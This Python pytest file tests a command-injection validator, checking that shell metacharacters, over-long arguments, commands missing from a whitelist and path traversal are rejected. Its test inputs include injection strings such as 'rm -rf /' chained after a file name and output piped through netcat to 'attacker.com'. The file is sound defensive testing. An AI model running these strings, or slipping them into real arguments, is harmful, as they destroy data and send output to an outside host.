"""
Test Suite for Command Validator

Tests command injection prevention with legitimate inputs, edge cases, and
malicious attack vectors to ensure robust security.

Run with:
    pytest tests/security/test_command_validator.py -v
"""

import os
import sys

import pytest

# Add parent directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from execution.security import CommandValidator, ValidationError


class TestCommandValidator:
    """Tests for command injection prevention"""

    def test_validate_simple_argument(self):
        """Test that simple arguments are accepted"""
        result = CommandValidator.validate_safe_argument("myfile.txt")
        assert result == "myfile.txt"

    def test_reject_command_chaining_ampersand(self):
        """Test that & command chaining is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: &"):
            CommandValidator.validate_safe_argument("file.txt && rm -rf /")

    def test_reject_command_chaining_pipe(self):
        """Test that | pipe is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: |"):
            CommandValidator.validate_safe_argument("file.txt | nc attacker.com 1234")

    def test_reject_command_chaining_semicolon(self):
        """Test that ; semicolon is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: ;"):
            CommandValidator.validate_safe_argument("file.txt; rm -rf /")

    def test_reject_backtick_execution(self):
        """Test that backtick command execution is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: `"):
            CommandValidator.validate_safe_argument("file_`whoami`.txt")

    def test_reject_dollar_sign_expansion(self):
        """Test that $() command substitution is rejected"""
        with pytest.raises(ValidationError, match=r"dangerous character: \$"):
            CommandValidator.validate_safe_argument("file_$(whoami).txt")

    def test_reject_redirection(self):
        """Test that I/O redirection is rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file.txt > /dev/null")

    def test_reject_very_long_argument(self):
        """Test that overly long arguments are rejected"""
        with pytest.raises(ValidationError, match="too long"):
            CommandValidator.validate_safe_argument("a" * 2000)

    def test_validate_command_path_simple(self):
        """Test that simple command paths are accepted"""
        result = CommandValidator.validate_command_path("python")
        assert result == "python"

    def test_validate_command_path_with_whitelist(self):
        """Test command path with whitelist"""
        result = CommandValidator.validate_command_path("python", allowed_commands=["python", "pip", "pytest"])
        assert result == "python"

    def test_reject_command_not_in_whitelist(self):
        """Test that commands not in whitelist are rejected"""
        with pytest.raises(ValidationError, match="not in whitelist"):
            CommandValidator.validate_command_path("malicious_command", allowed_commands=["python", "pip", "pytest"])

    def test_reject_command_path_traversal(self):
        """Test that path traversal in commands is rejected"""
        with pytest.raises(ValidationError, match="path traversal"):
            CommandValidator.validate_command_path("../../usr/bin/malicious")
